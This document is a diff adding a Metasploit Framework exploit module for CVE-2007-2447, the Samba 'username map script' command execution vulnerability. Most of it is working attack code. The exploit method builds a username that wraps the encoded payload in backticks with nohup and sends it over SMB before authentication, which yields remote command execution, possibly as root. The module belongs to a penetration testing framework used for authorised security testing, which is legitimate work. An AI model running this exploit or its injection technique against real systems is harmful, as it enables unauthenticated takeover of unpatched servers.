@@ -1,0 +1,91 @@
+##
+# $Id: usermap_script.rb 10040 2010-08-18 17:24:46Z jduck $
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = ExcellentRanking
+
+	include Msf::Exploit::Remote::SMB
+
+	# For our customized version of session_setup_ntlmv1
+	CONST = Rex::Proto::SMB::Constants
+	CRYPT = Rex::Proto::SMB::Crypt
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'Samba "username map script" Command Execution',
+			'Description'    => %q{
+					This module exploits a command execution vulerability in Samba
+				versions 3.0.20 through 3.0.25rc3 when using the non-default
+				"username map script" configuration option. By specifying a username
+				containing shell meta characters, attackers can execute arbitrary
+				commands.
+
+				No authentication is needed to exploit this vulnerability since
+				this option is used to map usernames prior to authentication!
+			},
+			'Author'         => [ 'jduck' ],
+			'License'        => MSF_LICENSE,
+			'Version'        => '$Revision: 10040 $',
+			'References'     =>
+				[
+					[ 'CVE', '2007-2447' ],
+					[ 'OSVDB', '34700' ],
+					[ 'BID', '23972' ],
+					[ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534' ],
+					[ 'URL', 'http://samba.org/samba/security/CVE-2007-2447.html' ]
+				],
+			'Platform'       => ['unix'],
+			'Arch'           => ARCH_CMD,
+			'Privileged'     => true, # root or nobody user
+			'Payload'        =>
+				{
+					'Space'    => 1024,
+					'DisableNops' => true,
+					'Compat'      =>
+						{
+							'PayloadType' => 'cmd',
+							# *_perl and *_ruby work if they are installed
+							# mileage may vary from system to system..
+						}
+				},
+			'Targets'        =>
+				[
+					[ "Automatic", { } ]
+				],
+			'DefaultTarget'  => 0,
+			'DisclosureDate' => 'May 14 2007'))
+
+		register_options(
+			[
+				Opt::RPORT(139)
+			], self.class)
+	end
+
+
+	def exploit
+
+		connect
+
+		# lol?
+		username = "/=`nohup " + payload.encoded + "`"
+		begin
+			simple.client.negotiate(false)
+			simple.client.session_setup_ntlmv1(username, rand_text(16), datastore['SMBDomain'], false)
+		rescue ::Timeout::Error, XCEPT::LoginError
+			# nothing, it either worked or it didn't ;)
+		end
+
+		handler
+	end
+
+end
